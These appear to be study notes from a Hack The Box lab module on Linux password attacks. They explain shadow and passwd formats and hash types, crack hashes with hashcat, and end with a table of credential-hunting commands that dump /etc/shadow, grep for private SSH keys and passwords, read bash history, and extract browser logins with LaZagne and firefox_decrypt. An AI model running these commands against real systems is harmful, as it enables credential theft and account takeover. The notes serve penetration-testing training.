## Passwd, Shadow & Opasswd
```shell-session
root@htb:~# cat /etc/shadow

...SNIP...
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

| `<username>`: | `<encrypted password>`: | `<day of last change>`: | `<min age>`: | `<max age>`: | `<warning period>`: | `<inactivity period>`: | `<expiration date>`: | `<reserved field>` |
| ------------- | ----------------------- | ----------------------- | ------------ | ------------ | ------------------- | ---------------------- | -------------------- | ------------------ |
The encryption of the password in this file is formatted as follows:
|`$ <id>`|`$ <salt>`|`$ <hashed>`|

The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

|**ID**|**Cryptographic Hash Algorithm**|
|---|---|
|`$1$`|[MD5](https://en.wikipedia.org/wiki/MD5)|
|`$2a$`|[Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))|
|`$5$`|[SHA-256](https://en.wikipedia.org/wiki/SHA-2)|
|`$6$`|[SHA-512](https://en.wikipedia.org/wiki/SHA-2)|
|`$sha1$`|[SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)|
|`$y$`|[Yescrypt](https://github.com/openwall/yescrypt)|
|`$gy$`|[Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1)|
|`$7$`|[Scrypt](https://en.wikipedia.org/wiki/Scrypt)|

```shell-session
[!bash!]$ cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

| `<username>:` | `<password>:` | `<uid>:` | `<gid>:` | `<comment>:` | `<home directory>:` | `<cmd executed after logging in>` |
| ------------- | ------------- | -------- | -------- | ------------ | ------------------- | --------------------------------- |
The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file.
==Opasswd==
The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.
Looking at the contents of this file, we can see that it contains several entries for the user `cry0l1t3`, separated by a comma (`,`). Another critical point to pay attention to is the hashing type that has been used. This is because the `MD5` (`$1$`) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.
==Cracking MD5 Hashes==

```shell-session
Orbixio@htb[/htb]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
U93HdchOpEUP9iUxGVIvq
```

```shell-session
Orbixio@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```
#### Unshadow

```shell-session
# Unshadow the hash
Orbixio@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
Orbixio@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
Orbixio@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Cracking the unshadowed file
Orbixio@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Credential Hunting
  
There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

| **`Files`**  | **`History`**        | **`Memory`**         | **`Key-Rings`**            |
| ------------ | -------------------- | -------------------- | -------------------------- |
| Configs      | Logs                 | Cache                | Browser stored credentials |
| Databases    | Command-line History | In-memory Processing |                            |
| Notes        |                      |                      |                            |
| Scripts      |                      |                      |                            |
| Source codes |                      |                      |                            |
| Cronjobs     |                      |                      |                            |
| SSH Keys     |                      |                      |                            |

|**Command**|**Description**|
|---|---|
|`for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`|Script that can be used to find .conf, .config and .cnf files on a Linux system.|
|`for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`|Script that can be used to find credentials in specified file types.|
|`for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`|Script that can be used to find common database files.|
|`find /home/* -type f -name "*.txt" -o ! -name "*.*"`|Uses Linux-based find command to search for text files.|
|`for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`|Script that can be used to search for common file types used with scripts.|
|`for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`|Script used to look for common types of documents.|
|`cat /etc/crontab`|Uses Linux-based cat command to view the contents of crontab in search for credentials.|
|`ls -la /etc/cron.*/`|Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.|
|`grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`|Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.|
|`grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`|Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory.|
|`grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`|Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory.|
|`tail -n5 /home/*/.bash*`|Uses Linux-based tail command to search the through bash history files and output the last 5 lines.|
|`python3 mimipenguin.py`|Runs Mimipenguin.py using python3.|
|`bash mimipenguin.sh`|Runs Mimipenguin.sh using bash.|
|`python2.7 lazagne.py all`|Runs Lazagne.py with all modules using python2.7|
|`ls -l .mozilla/firefox/ \| grep default`|Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.|
|`cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`|Uses Linux-based command cat to search for credentials stored by Firefox in JSON.|
|`python3.9 firefox_decrypt.py`|Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.|
|`python3 lazagne.py browsers`|Runs Lazagne.py browsers module using Python 3.|
For further refrence: https://academy.hackthebox.com/module/147/section/1320